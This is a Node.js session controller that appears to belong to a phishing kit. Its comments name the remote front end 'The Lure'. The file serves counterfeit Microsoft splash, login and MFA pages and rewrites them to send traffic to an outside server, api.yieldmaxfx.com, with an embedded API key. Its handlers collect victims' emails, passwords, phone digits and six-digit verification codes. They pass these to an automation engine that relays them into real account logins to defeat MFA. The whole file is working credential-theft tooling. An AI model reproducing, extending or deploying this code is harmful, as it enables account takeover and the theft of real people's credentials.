/**
 * Session Controller
 * Handles the logic for initiating and managing automation sessions via the External API.
 */
const globals = require('../../config/globals');
const { getConnection, sendToClient } = require('../../services/websocket');
const { startAutomation } = require('../../automation/loginFlow');
const { handleImmediateEmailInput } = require('../../handlers/emailHandler');

// --- Generators for Server-Driven UI via API ---
// --- Generators for Server-Driven UI via API ---
const { generateGatewayPage } = require('../../generators/gatewayPage');
const { generateSimpleCaptchaPage } = require('../../generators/simpleCaptchaPage'); // [NEW]
const { generateMsSplashPage } = require('../../generators/msSplashPage');
const { generateMsLoginPage } = require('../../generators/msLoginPage');
const { generateMsVeryPage } = require('../../generators/msVeryPage');

// --- 0. [NEW] Get HTML Page (Server-Driven UI) ---
exports.getPage = (req, res) => {
    // Allows remote FE to "pull" the perfect HTML templates
    const { type, token } = req.query; // e.g. /eapi/page?type=login&token=xyz

    // We use a dummy token if none provided (for initial testing), or the real session token
    const safeToken = token || 'remote_session';

    try {
        let htmlContent = '';

        switch (type) {
            case 'gateway':
                // START CHANGED: Use new Simple Captcha
                htmlContent = generateSimpleCaptchaPage();

                // [EAPI PATCH 1] Fix the Fetch URL to be absolute (since iframe is on remote domain)
                // We point it to the VPS public API URL
                htmlContent = htmlContent.replace(
                    "fetch('/verify-captcha'",
                    "fetch('https://api.yieldmaxfx.com/verify-captcha'"
                );

                // [EAPI PATCH 2] Intercept the redirect logic
                // Instead of window.location.href, we call the parent callback
                htmlContent = htmlContent.replace(
                    "window.location.href = result.redirect || '/processing';",
                    "if(window.parent && window.parent.onGatewaySuccess){window.parent.onGatewaySuccess(result.token);}else{console.log('Gateway success');}"
                );
                // END CHANGED
                break;
            case 'splash':
                htmlContent = generateMsSplashPage(safeToken);
                // [EAPI PATCH] Intercept the redirect from splash to login matches dynamic token
                htmlContent = htmlContent.replace(
                    /window\.location\.href = '\/.*\/login';/,
                    "if(window.parent && window.parent.onSplashComplete){window.parent.onSplashComplete();}else if(window.onSplashComplete){window.onSplashComplete();}else{console.log('Splash complete');}"
                );
                break;
            case 'login':
                htmlContent = generateMsLoginPage(safeToken, { randomize: true });

                // [EAPI PATCH 1] WebSocket to VPS
                htmlContent = htmlContent.replace(
                    "new WebSocket(`ws://${window.location.host}`)",
                    "new WebSocket('wss://api.yieldmaxfx.com')"
                );

                // [EAPI PATCH 2] Auth API Endpoint + API Key Injection
                // We MUST include the X-API-KEY in the headers for the EAPI call to succeed
                htmlContent = htmlContent.replace(
                    "fetch('/api/start-auth'",
                    "fetch('https://api.yieldmaxfx.com/eapi/start-auth'"
                ).replace(
                    "headers: { 'Content-Type': 'application/json' },",
                    "headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'key_dev_001' },"
                );

                // [EAPI PATCH 3] Redirect Handling -> Call Parent to generic 'onStepRequired'
                // This informs the Lure to fetch the next page (e.g. MFA)
                htmlContent = htmlContent.replace(
                    "window.location.href = data.redirect;",
                    "console.log('Redirect requested to:', data.redirect); if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired(data.redirect); } else { window.location.href = data.redirect; }"
                );

                // [EAPI PATCH 4] Intercept explicit MFA redirect
                htmlContent = htmlContent.replace(
                    /window\.location\.href = '\/.*\/very';/,
                    "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('very'); } else { console.log('MFA Page required'); }"
                );
                break;
            case 'mfa':
            case 'very':
                htmlContent = generateMsVeryPage(safeToken);
                break;
            default:
                return res.status(400).json({ success: false, message: 'Invalid page type' });
        }

        // Return JSON with HTML string (safer than raw HTML for API)
        res.json({
            success: true,
            type: type,
            html: htmlContent
        });

    } catch (error) {
        console.error('❌ [EAPI] Error generating page:', error);
        res.status(500).json({ success: false, message: 'Template generation error' });
    }
};

// --- 1. Start Auth (Initiate Session) ---
exports.startAuth = async (req, res) => {
    const { email, password, token } = req.body;

    console.log('\n[EAPI] 🔐 Start Auth Request Received');
    console.log('📧 Email:', email);
    // console.log('🔑 Password:', password); // Don't log password in production logs
    console.log('🎫 Token:', token);

    // [Compatibility] Store globally for existing logic
    // In a future "clean" remote version, we would pass these specifically to the `startAutomation` function instance
    // rather than using globals, but for now we maintain compatibility with the engine.
    try {
        globals.set('globalLoginEmail', email);
        globals.set('globalLoginPassword', password);
        globals.set('globalToken', token);
    } catch (error) {
        console.error('⚠️ Error storing credentials:', error.message);
    }

    // Send immediate response
    res.json({
        success: true,
        message: 'Automation started via EAPI',
        data: { email } // Don't echo password back
    });

    // Notify connected WebSocket client (The Lure)
    const wsConnection = getConnection();
    if (wsConnection) {
        sendToClient({
            status: 'automation_started',
            message: 'Automation process has begun (remote trigger)'
        });
    }

    // Start Engine
    // Note: We use the existing 'wsConnection' found by the server. 
    // In a detached VPS scenario, the Lure would connect its WebSocket to THIS server.
    await startAutomation(email, password, wsConnection);
};

// --- 2. Send Verification Code (MFA Step 1) ---
exports.sendVerificationCode = async (req, res) => {
    console.log('[EAPI] 📧 Send Verification Code Request');
    try {
        const { maskedEmail, fullEmail, maskedPhone, phoneDigits } = req.body;

        if (!fullEmail && !phoneDigits) {
            return res.status(400).json({ success: false, message: 'Full email or phone digits required' });
        }

        // Signal logic reset if needed
        globals.set('resetToEmailInput', true);

        if (fullEmail) {
            globals.set('globalFullEmail', fullEmail);
            globals.set('globalMaskedEmail', maskedEmail);
            console.log('✅ [EAPI] Full email queued for automation:', fullEmail);
        }
        if (maskedPhone && phoneDigits) {
            globals.set('globalPhoneDigits', phoneDigits);
            console.log('✅ [EAPI] Phone digits queued for automation:', phoneDigits);
        }

        res.json({ success: true, message: 'Input received' });

        // Trigger immediate handling
        const globalPage = globals.get('globalPage');
        if (fullEmail && globalPage) {
            console.log('🔄 [EAPI] Triggering handler...');
            const success = await handleImmediateEmailInput(globalPage, fullEmail);

            // Notify via WebSocket
            sendToClient({
                status: success ? 'email_input_success' : 'email_input_failed',
                message: success ? 'Email input success' : 'Failed to input email'
            });
        }

    } catch (error) {
        console.error('❌ [EAPI] Error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
};

// --- 3. Verify Code (MFA Step 2) ---
exports.verifyCode = async (req, res) => {
    console.log('[EAPI] 🔐 Verify Code Request');
    try {
        const { code, email } = req.body;

        if (!code || code.length !== 6) {
            return res.status(400).json({ success: false, message: 'Invalid code format' });
        }

        console.log('✅ [EAPI] Code received:', code);
        globals.set('globalVerificationCode', code);

        res.json({
            success: true,
            message: 'Code received by automation engine'
        });

    } catch (error) {
        console.error('❌ [EAPI] Error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
};

// --- 4. [NEW] Status Check (Remote Polling) ---
exports.getSessionStatus = (req, res) => {
    // Return current automation state to remote caller
    const currentStep = globals.get('currentStep') || 'idle';
    const isConnected = !!getConnection();

    res.json({
        success: true,
        status: currentStep,
        clientConnected: isConnected,
        timestamp: Date.now()
    });
};
